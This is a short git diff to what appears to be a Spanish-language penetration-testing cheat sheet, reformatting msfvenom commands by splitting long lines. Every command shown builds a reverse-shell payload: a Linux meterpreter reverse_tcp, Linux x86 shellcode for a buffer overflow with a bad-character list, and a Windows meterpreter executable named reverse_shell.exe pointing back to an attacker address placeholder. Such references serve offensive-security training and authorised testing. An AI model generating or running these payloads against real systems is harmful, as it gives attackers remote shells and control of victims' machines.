@@ -78,15 +78,16 @@ msfvenom -p linux/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atac
 ```
 ```
 # Buffer Overflow en Linux - Shellcode
-msfvenom -p linux/x86/shell_reverse_tcp lhost=[ip_atacante] lport=[puerto_atacante] --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
+msfvenom -p linux/x86/shell_reverse_tcp lhost=[ip_atacante] lport=[puerto_atacante] --format c --arch x86 --platform linux 
+--bad-chars "\x00\x09\x0a\x20" --out shellcode
 ```
 </b>
 
 <b>Ejemplos de generación de un Meterpreter con MSFVenom:</b>
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform windows -a x64 -n 200 -e generic/none -i 4 -f exe -o reverse_shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform windows -a x64 -n 200 -e generic/none -i 4 
+-f exe -o reverse_shell.exe
 
 
 
-</b>
